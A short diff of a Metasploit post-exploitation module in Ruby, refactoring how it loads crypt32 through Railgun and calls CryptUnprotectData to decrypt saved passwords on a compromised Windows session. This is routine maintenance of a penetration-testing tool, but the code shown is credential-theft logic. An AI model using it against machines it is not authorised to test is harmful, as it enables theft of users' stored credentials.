@@ -29,14 +29,12 @@ class MetasploitModule < Msf::Post
   end
 
   def prepare_railgun
-    rg = session.railgun
-    if (!rg.get_dll('crypt32'))
-      rg.add_dll('crypt32')
+    if (!session.railgun.get_dll('crypt32'))
+      session.railgun.add_dll('crypt32')
     end
   end
 
   def decrypt_password(data)
-    rg = session.railgun
     pid = client.sys.process.getpid
     process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -46,12 +44,12 @@ class MetasploitModule < Msf::Post
     if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = [mem].pack("Q")
       len = [data.length].pack("Q")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
       len, addr = ret["pDataOut"].unpack("Q2")
     end
 
